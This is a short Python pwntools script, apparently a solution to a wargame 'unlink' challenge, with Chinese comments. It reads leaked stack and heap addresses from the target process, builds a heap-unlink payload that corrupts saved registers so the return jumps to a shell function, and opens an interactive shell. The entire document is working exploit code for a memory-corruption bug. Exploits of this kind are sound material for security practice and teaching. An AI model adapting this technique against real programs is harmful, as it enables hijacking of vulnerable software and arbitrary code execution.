from pwn import *
context.arch = 'i386'    # i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)        # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'        # heap + 16
payload += '4444'
payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.
r.sendline( payload )
r.interactive()

# 将ebp改为heap+16
# ebp-4地址处的值会写入ecx，即ecx = heap+12
# ecx-4写入esp，即esp = heap + 8 = shell
# ret转到esp，即转到shell